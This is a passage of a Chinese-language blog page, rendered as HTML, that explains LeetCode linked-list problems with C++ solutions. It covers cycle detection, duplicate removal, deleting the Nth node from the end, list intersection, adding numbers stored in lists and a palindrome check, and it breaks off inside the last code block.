</span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode*&gt; pot;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pot.<span class="built_in">count</span>(head))</span><br><span class="line">                <span class="keyword">return</span> head;<span class="comment">//不同之处，直接返回结点指针</span></span><br><span class="line">            pot.<span class="built_in">insert</span>(head);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;<span class="comment">//NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><p><strong>快慢指针：</strong></p><p><img src="https://img-blog.csdnimg.cn/1640266274d440cd8332dbb60b3da4f3.png"><br>因为要找环形的入口，那么要求的是x，因为x表示 头结点到 环形入口节点的的距离。<br>所以要求x ，将x单独放在左面：x = n (y + z) - y ,<br>再从n(y+z)中提出一个 （y+z）来，整理公式之后为如下公式：<strong>x = (n - 1) (y + z) + z</strong> 注意这里n一定是大于等于1的，因为 fast指针至少要多走一圈才能相遇slow指针。<br><strong>【从头结点出发一个指针，从相遇节点 也出发一个指针，这两个指针每次只走 一个 节点， 当这两个指针相遇的时候就是 环形入口的节点。】</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    快慢指针slow fast</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//找相遇结点</span></span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(slow==fast)&#123;</span><br><span class="line">                <span class="comment">// 快慢指针相遇，此时从head 和 相遇点，同时查找直至相遇</span></span><br><span class="line">                ListNode *index1 = fast;<span class="comment">//相遇处</span></span><br><span class="line">                ListNode *index2 = head;<span class="comment">//头结点处</span></span><br><span class="line">                <span class="keyword">while</span>(index1!=index2)&#123;</span><br><span class="line">                    index1 = index1-&gt;next;</span><br><span class="line">                    index2 = index2-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> index2;<span class="comment">//环的入口处 </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="83-删除排序链表中的重复元素——留一个"><a href="#83-删除排序链表中的重复元素——留一个" class="headerlink" title="83 删除排序链表中的重复元素——留一个"></a>83 删除排序链表中的重复元素——留一个</h3><p>如果重复，只留下其中一个</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *l = head,*r = l-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(r)&#123;<span class="comment">//右指针 用来遍历</span></span><br><span class="line">            <span class="keyword">if</span>(l-&gt;val!=r-&gt;val)&#123;</span><br><span class="line">                l-&gt;next = r;<span class="comment">//左指针 用来衔接</span></span><br><span class="line">                l = l-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        l-&gt;next = r;<span class="comment">//l-&gt;next = nullptr;</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一次遍历 O(n)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)   <span class="comment">//判空</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>(cur-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val == cur-&gt;next-&gt;val)</span><br><span class="line">                cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>) </span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        head-&gt;next = <span class="built_in">deleteDuplicates</span>(head-&gt;next);</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">            head-&gt;val == head-&gt;next-&gt;val ? head-&gt;next : head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="82-删除排序链表中的重复元素Ⅱ——都删除"><a href="#82-删除排序链表中的重复元素Ⅱ——都删除" class="headerlink" title="82 删除排序链表中的重复元素Ⅱ——都删除"></a>82 删除排序链表中的重复元素Ⅱ——都删除</h3><p>删除重复结点：只要是重复的，都删除</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplicates</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="comment">//多个 pre 是前驱结点</span></span><br><span class="line">        ListNode *pre = dummy;</span><br><span class="line">        pre-&gt;next = head;</span><br><span class="line">        ListNode *cur = head;<span class="comment">//cur用于遍历</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur-&gt;val == cur-&gt;next-&gt;val)&#123;</span><br><span class="line">                <span class="keyword">int</span> val = cur-&gt;val;</span><br><span class="line">                <span class="keyword">while</span>(cur!=<span class="literal">nullptr</span> &amp;&amp; cur-&gt;val == val)</span><br><span class="line">                    cur = cur-&gt;next;<span class="comment">//找不重复的 cur</span></span><br><span class="line">                pre-&gt;next = cur;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                pre = cur;</span><br><span class="line">                cur = cur-&gt;next;<span class="comment">//后移</span></span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="19-删除链表的倒数第-N-个结点"><a href="#19-删除链表的倒数第-N-个结点" class="headerlink" title="19 删除链表的倒数第 N 个结点"></a>19 删除链表的倒数第 N 个结点</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    找到倒数n结点的位置，让其 前驱结点的next 指向 其next的next</span></span><br><span class="line"><span class="comment">    倒数第n个结点：正数第len-n+1个结点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getLength</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            len++;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//虚拟头结点：由于可能删除第一个结点</span></span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">getLength</span>(head);</span><br><span class="line">        ListNode *cur = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len-n+<span class="number">1</span>;i++)&#123;<span class="comment">//找其前驱</span></span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;<span class="comment">//删除结点</span></span><br><span class="line">        ListNode *ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> dummy;<span class="comment">//释放空间</span></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="comment">//first 比 second 超前n个结点，first到尾结点时，second刚好到要删除结点的【前驱结点】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>,head);</span><br><span class="line">        ListNode *first = head,*second = dummy;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;<span class="comment">//first 比 second超前n个结点   </span></span><br><span class="line">            first = first-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(first)&#123;</span><br><span class="line">            first = first-&gt;next;</span><br><span class="line">            second = second-&gt;next;</span><br><span class="line">            <span class="comment">//因为second初始位置是dummy，所以最后指向被删结点的前驱</span></span><br><span class="line">        &#125;</span><br><span class="line">        second-&gt;next = second-&gt;next-&gt;next;<span class="comment">//删除结点</span></span><br><span class="line">        ListNode *ans = dummy-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> dummy;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="面试题-02-07-链表相交"><a href="#面试题-02-07-链表相交" class="headerlink" title="面试题 02.07. 链表相交"></a>面试题 02.07. 链表相交</h3><p>给你两个单链表的头节点 headA 和 headB ，请你找出并<strong>返回两个单链表相交的起始节点</strong>。如果两个链表没有交点，返回 null。<br>题目数据 保证 整个链式结构中不存在环。<br>注意，函数返回结果后，链表必须 保持其原始结构 。<br><strong>求两个链表交点节点的指针。 这里同学们要注意，交点不是数值相等，而是 指针相等【next指向同一结点】。看下图：</strong><br><img src="https://img-blog.csdnimg.cn/b96a4ea1680f4da29b48916ddba26b2f.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针：同时更新 pA pB</span></span><br><span class="line"><span class="comment">    a+c+b == b+c+a</span></span><br><span class="line"><span class="comment">    pA为空，则指向B链表；pB为空，则指向A链表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(headA==<span class="literal">NULL</span> || headB==<span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *pA = headA, *pB = headB;</span><br><span class="line">        <span class="keyword">while</span>(pA != pB)&#123;</span><br><span class="line">            pA = pA==<span class="literal">NULL</span>? headB:pA-&gt;next;</span><br><span class="line">            pB = pB==<span class="literal">NULL</span>? headA:pB-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pB;<span class="comment">//返回的是 相交结点 的指针</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希集合O(m+n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;ListNode *&gt; visited;</span><br><span class="line">        ListNode *tmp = headA;</span><br><span class="line">        <span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            visited.<span class="built_in">insert</span>(tmp);<span class="comment">//存的是指针【结点】！！！</span></span><br><span class="line">            tmp = tmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = headB;</span><br><span class="line">        <span class="keyword">while</span>(tmp != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited.<span class="built_in">count</span>(tmp))&#123;</span><br><span class="line">                <span class="keyword">return</span> tmp;<span class="comment">//寻找 指针相同【结点相同】</span></span><br><span class="line">            &#125;</span><br><span class="line">            tmp = tmp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-两数相加——【逆序】存储在链表中"><a href="#2-两数相加——【逆序】存储在链表中" class="headerlink" title="2 两数相加——【逆序】存储在链表中"></a>2 两数相加——【逆序】存储在链表中</h3><p>给你两个 非空 的链表，表示<strong>两个非负的整数</strong>。它们每位数字都是按照 <strong>逆序 的方式存储</strong>的，并且每个节点只能存储 一位 数字。<br>请你将两个数相加，并以相同形式<strong>返回一个表示和的链表【逆序存储】</strong>。<br>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">逆序相加，逆序存储</span></span><br><span class="line"><span class="comment">l1:2 4 3</span></span><br><span class="line"><span class="comment">l2:5 6 4</span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">   7 0 8</span></span><br><span class="line"><span class="comment">注意进位 carry 和最后的</span></span><br><span class="line"><span class="comment">    if(carry &gt; 0)</span></span><br><span class="line"><span class="comment">        tail-&gt;next = new ListNode(carry);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode *head = <span class="literal">nullptr</span>,*tail = <span class="literal">nullptr</span>;<span class="comment">//头结点和尾结点</span></span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;<span class="comment">//进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1 || l2)&#123;</span><br><span class="line">            <span class="keyword">int</span> n1 = l1?l1-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> n2 = l2?l2-&gt;val:<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = n1+n2+carry;</span><br><span class="line">            <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">                head = tail = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);<span class="comment">//新建链表</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">                tail = tail-&gt;next;<span class="comment">//尾结点后移</span></span><br><span class="line">            &#125;</span><br><span class="line">            carry = sum / <span class="number">10</span>;   <span class="comment">//进位</span></span><br><span class="line">            <span class="keyword">if</span>(l1)</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(l2)</span><br><span class="line">                l2 = l2-&gt;next; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)<span class="comment">//最后如果还有进位的话</span></span><br><span class="line">            tail-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(carry);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="445-两数相加-II——【正序】存储在链表中"><a href="#445-两数相加-II——【正序】存储在链表中" class="headerlink" title="445 两数相加 II——【正序】存储在链表中"></a>445 两数相加 II——【正序】存储在链表中</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">逆序问题，用栈！！！！！！！！</span></span><br><span class="line"><span class="comment">l1:7 2 4 3</span></span><br><span class="line"><span class="comment">l2:  5 6 4</span></span><br><span class="line"><span class="comment">返回：</span></span><br><span class="line"><span class="comment">   7 8 0 7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt;s1,s2;</span><br><span class="line">        <span class="keyword">while</span>(l1)&#123;</span><br><span class="line">            s1.<span class="built_in">push</span>(l1-&gt;val);</span><br><span class="line">            l1 = l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2)&#123;</span><br><span class="line">            s2.<span class="built_in">push</span>(l2-&gt;val);</span><br><span class="line">            l2 = l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        ListNode *ans = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span>(!s1.<span class="built_in">empty</span>() <span class="keyword">or</span> !s2.<span class="built_in">empty</span>() <span class="keyword">or</span> carry!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> a = s1.<span class="built_in">empty</span>()?<span class="number">0</span>:s1.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">int</span> b = s2.<span class="built_in">empty</span>()?<span class="number">0</span>:s2.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span>(!s1.<span class="built_in">empty</span>())</span><br><span class="line">                s1.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span>(!s2.<span class="built_in">empty</span>())</span><br><span class="line">                s2.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">int</span> sum = a + b + carry;</span><br><span class="line">            carry = sum/<span class="number">10</span>;</span><br><span class="line">            sum = sum%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">auto</span> node = <span class="keyword">new</span> <span class="built_in">ListNode</span>(sum);</span><br><span class="line">            node-&gt;next = ans;</span><br><span class="line">            ans = node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;<span class="comment">//正序返回</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="8-回文链表"><a href="#8-回文链表" class="headerlink" title="8 回文链表"></a>8 回文链表</h3><p>push_back() 向容器尾部添加元素时，首先会创建这个元素，然后再将这个元素拷贝或者移动到容器中（如果是拷贝的话，事后会自行销毁先前创建的这个元素）；<br>emplace_back() 在实现时，则是直接在容器尾部创建这个元素，省去了拷贝或移动元素的过程。<br><strong>判断是否是回文链表</strong><br>eg:[1,2,3,2,1]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组列表+双指针</span></span><br><span class="line"><span class="comment">    复制链表值到 数组列表 中。</span></span><br><span class="line"><span class="comment">    使用双指针法判断是否为回文。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一步： 遍历链表并将值复制到数组中，O(n)。</span></span><br><span class="line"><span class="comment">第二步：双指针判断是否为回文，执行了 O(n/2) 次的判断，即O(n)。</span></span><br><span class="line"><span class="comment">总的时间复杂度：O(2n) = O(n)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; vals;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            vals.<span class="built_in">emplace_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=vals.<span class="built_in">size</span>()<span class="number">-1</span>; i&lt;j; 